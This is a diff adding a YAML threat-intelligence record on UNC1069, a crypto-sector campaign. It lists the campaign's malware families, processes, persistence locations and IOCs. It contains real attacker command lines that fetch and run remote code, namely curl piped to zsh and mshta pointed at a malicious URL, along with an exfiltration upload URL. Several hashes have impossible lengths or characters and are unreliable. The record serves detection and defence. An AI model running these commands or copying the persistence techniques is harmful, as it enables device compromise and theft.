@@ -1,0 +1,149 @@
+description: UNC1069 targets cryptocurrency sector using social engineering with AI-enabled
+  lures and multiple malware families including SILENCELIFT, DEEPBREATH, and CHROMEPUSH.
+attribution: UNC1069
+malware_families:
+- SILENCELIFT
+- DEEPBREATH
+- CHROMEPUSH
+- WAVESHAPER
+- HYPERCALL
+- HIDDENCALL
+- SUGARLOADER
+TTPs:
+  processes:
+  - curl
+  - zsh
+  - setx
+  - pnputil
+  - mshta
+  - wmic
+  - msdt
+  - XProtect
+  - com.apple.system.updater
+  - SystemUpdater
+  - /Library/OSRecovery/SystemUpdater
+  - pkill
+  - ioreg
+  - cp
+  - rm
+  - softwareupdate
+  commandline:
+  - system_profiler SPAudioData
+  - softwareupdate --evaluate-products --products audio --agree-to-license
+  - curl -A audio -s hxxp://mylingocoin[.]com/audio/fix/6454694440 | zsh
+  - setx audio_volume 100
+  - pnputil /enum-devices /connected /class "Audio"
+  - mshta hxxp://mylingocoin[.]com/audio/fix/6454694440
+  - wmic sounddev get Caption, ProductName, DeviceID, Status
+  - msdt -id AudioPlaybackDiagnostic
+  - /Library/OSRecovery/SystemUpdater
+  - /usr/libexec/PlistBuddy -c "print :IOConsoleUsers:0:CGSSessionScreenIsLocked\" /dev/stdin 2>/dev/null <<< \"$(ioreg -n Root -d1 -a)\"
+  - pkill -CONT -f
+  - pkill -STOP -f
+  - /Library/Caches/.Logs.db
+  - /usr/libexec/PlistBuddy -c "print :IOConsoleUsers:0:CGSSessionScreenIsLocked" /dev/stdin 2>/dev/null <<< "$(ioreg -n Root -d1 -a)"
+  powershell: []
+  scripting_engine:
+  - AppleScript
+  - zsh
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  image_load:
+  - /tmp/\.[A-Za-z0-9]{6}.
+  - NSCreateObjectFileImageFromMemory-[A-Za-z0-9]{8}
+  - NSCreateObjectFileImageFromMemory
+  - /usr/lib/libcurl.4.dylib
+  network_connections:
+  - curl hxxp://mylingocoin[.]com/audio/fix/6454694440
+  - mshta hxxp://mylingocoin[.]com/audio/fix/6454694440
+  - HYPERCALL wss://supportzm[.]com
+  - HYPERCALL wss://zmsupport[.]com
+  - support-zoom[.]us:80
+  - cmailer[.]pro:80
+  - breakdream[.]com:443
+  - dreamdie[.]com:443
+  - mylingocoin.com
+  - zoom.uswe05.us
+  - breakdream.com
+  - dreamdie.com
+  - support-zoom.us
+  - supportzm.com
+  - zmsupport.com
+  - cmailer.pro
+  file_activity:
+  - /Library/LaunchDaemons/com.apple.system.updater.plist
+  - /Library/OSRecovery/SystemUpdater
+  - /tmp/\.[A-Za-z0-9]{6}.
+  - /Library/OSRecovery/com.apple.os.config
+  - /Library/Caches/.Logs.db
+  - /tmp/.%s
+  - '%HOME%/Library/Application Support/Google/Chrome/NativeMessagingHosts/Google
+    Chrome Docs'
+  - '%HOME%/Library/Application Support/com.apple.os.receipts/'
+  - /var/log/install.log
+  - /dev/stdin
+  - /Library/SystemSettings/com.apple.system.settings
+  - /Users/<user>/Library/Application Support/Google/Chrome/NativeMessagingHosts/Brave
+    Browser Docs
+  - /Users/<user>/Library/Application Support/Google/Chrome/NativeMessagingHosts/Google
+    Chrome Docs
+  - /Library/Caches/chromeext
+  - /Library/Fonts/com.apple.logd
+  - /Library/SystemSettings/.CacheLogs.db
+  persistence:
+  - launch daemon configured to execute SUGARLOADER during macOS startup
+  - Native messaging host for Google Chrome
+  - SystemUpdater launch daemon
+  process_relations:
+  - curl -> zsh
+  - mshta -> wmic
+  - HYPERCALL -> HIDDENCALL
+  - HYPERCALL -> SUGARLOADER
+  - SUGARLOADER -> CHROMEPUSH
+IOCs:
+  hashes:
+  - c91725905b273e81e9cc6983a11c8d60
+  - eb7635f4836c9e0aa4c315b18b051cb5
+  - 4e4f2dfe143ba261fd8a18d1c4b58f2e
+  - 3712793d3847dd0962361aa528fa124c
+  - 452C2da7c012eda25a1403b3313444b5eb7C2c3e25eee489f1bd256f8434735
+  - b525837273dde06b86b5f93f9aeC2C29665324105b0b66f6df81884754f8080d
+  - e0156ed437701d36a7b46aabf086ede
+  - dc8f7608d4e19f6cb03680941bbd09fe969668bcb09c7ca985048a22e014dffcd
+  - 603848f37ab932dccef98ee27e3c5af9221d3b6ccfe457ccf93cb572495ac325
+  - b452c2da7c012eda25a1403b3313444b5eb7c2c3e25eee489f1bd256f8434735
+  - 1a30d6cdb0b98feed62563be8050db55ae0156ed437701d36a7b46aabf086ede
+  - c8f7608d4e19f6cb03680941bbd09fe969668bcb09c7ca985048a22e014dffcd
+  - c3e5d878a30a6c46e22d1dd2089b32086c91f13f8b9c413aa84e1dbaa03b9375
+  - 03f00a143b8929585c122d490b6a3895d639c17d92c22223917e3a9ca1b8d30f9
+  ip_addresses: []
+  domains:
+  - mylingocoin[.]com
+  - supportzm[.]com
+  - zmsupport[.]com
+  - breakdream[.]com
+  - dreamdie[.]com
+  - support-zoom[.]us
+  - cmailer[.]pro
+  - mylingocoin.com
+  - zoom.us
+  - we05.us
+  - zoom.uswe05.us
+  - breakdream.com
+  - dreamdie.com
+  - support-zoom.us
+  - supportzm.com
+  - zmsupport.com
+  - cmailer.pro
+  urls:
+  - hxxp://mylingocoin[.]com/audio/fix/6454694440
+  - wss://supportzm[.]com
+  - wss://zmsupport[.]com
+  - hxxp://cmailer[.]pro:80/upload
+authors:
+- Ross Inman
+- Adrian Hernandez
+- Google Threat Intelligence Group (GTIG)
+reference: https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering
+date_of_publication: November 03, 2025
+file_creation_date: February 10, 2026
